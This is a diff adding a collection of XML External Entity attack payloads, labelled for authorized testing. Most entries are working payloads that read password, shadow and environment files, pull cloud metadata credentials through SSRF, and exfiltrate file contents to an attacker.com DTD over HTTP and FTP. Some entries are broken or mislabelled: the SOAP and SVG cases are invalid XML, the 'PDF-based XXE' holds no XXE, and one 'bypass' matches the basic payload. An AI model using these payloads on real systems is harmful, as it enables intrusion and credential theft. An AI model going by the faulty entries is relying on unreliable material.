@@ -1,0 +1,319 @@
+# XML External Entity (XXE) Payloads Collection
+# For authorized security testing only
+
+# ============================================
+# BASIC XXE DETECTION
+# ============================================
+
+# Simple XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+# Blind XXE with parameter entity
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
+  %xxe;
+]>
+<root>test</root>
+
+# ============================================
+# FILE READ XXE PAYLOADS
+# ============================================
+
+# Linux files
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/shadow">
+]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/hosts">
+]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
+]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///proc/version">
+]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///proc/self/cmdline">
+]>
+<root>&xxe;</root>
+
+# Windows files
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
+]>
+<root>&xxe;</root>
+
+# ============================================
+# BLIND XXE (OUT-OF-BAND)
+# ============================================
+
+# External DTD file (attacker.com/xxe.dtd):
+# <!ENTITY % data SYSTEM "file:///etc/passwd">
+# <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
+# %param1;
+
+# Payload using external DTD
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
+  %xxe;
+]>
+<root>test</root>
+
+# Using parameter entities
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<root>&send;</root>
+
+# ============================================
+# SSRF VIA XXE
+# ============================================
+
+# Basic SSRF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root>&xxe;</root>
+
+# AWS metadata
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+]>
+<root>&xxe;</root>
+
+# GCP metadata
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/hostname">
+]>
+<root>&xxe;</root>
+
+# Azure metadata
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
+]>
+<root>&xxe;</root>
+
+# Internal network scan
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://localhost:8080/">
+]>
+<root>&xxe;</root>
+
+# ============================================
+# OOB (OUT-OF-BAND) DATA EXFILTRATION
+# ============================================
+
+# Method 1: Using external DTD with file://
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<root>&send;</root>
+
+# Method 2: Using FTP
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "ftp://attacker.com/evil.dtd">
+  %dtd;
+]>
+<root>&send;</root>
+
+# Method 3: Using HTML entity
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<root>&send;</root>
+
+# ============================================
+# CDATA INJECTION
+# ============================================
+
+# Wrapping in CDATA
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY start "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///etc/passwd">
+  <!ENTITY end "]]>">
+]>
+<root>&start;&file;&end;</root>
+
+# ============================================
+# XML EXTERNAL ENTITY WITH ENCODING
+# ============================================
+
+# UTF-8 BOM bypass
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+# UTF-16 encoding
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+# UTF-32 encoding
+<?xml version="1.0" encoding="UTF-32"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+# ============================================
+# JAR FILE XXE
+# ============================================
+
+# XXE in JAR files
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/">
+]>
+<root>&xxe;</root>
+
+# ============================================
+# XSLT INJECTION (Related)
+# ============================================
+
+# Basic XSLT
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:value-of select="system-property('xsl:vendor')"/>
+  </xsl:template>
+</xsl:stylesheet>
+
+# File read via XSLT
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:copy-of select="document('file:///etc/passwd')"/>
+  </xsl:template>
+</xsl:stylesheet>
+
+# ============================================
+# BYPASS TECHNIQUES
+# ============================================
+
+# Using different XML features
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://attacker.com">
+]>
+<root>&xxe;</root>
+
+# Using different protocols
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "gopher://localhost:6379/_INFO">
+]>
+<root>&xxe;</root>
+
+# Using different encodings
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+# ============================================
+# SOAP-BASED XXE
+# ============================================
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <foo>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      &xxe;
+    </foo>
+  </soap:Body>
+</soap:Envelope>
+
+# ============================================
+# SVG-BASED XXE
+# ============================================
+
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <defs>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <text x="0" y="20">&xxe;</text>
+  </defs>
+</svg>
+
+# ============================================
+# PDF-BASED XXE
+# ============================================
+
+%PDF-1.4
+%âãÏÓ
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
+endobj
+xref
+0 4
+0000000000 65535 f 
+0000000009 00000 n 
+0000000058 00000 n 
+0000000115 00000 n 
+trailer
+<< /Size 4 /Root 1 0 R >>
+startxref
+190
+%%EOF
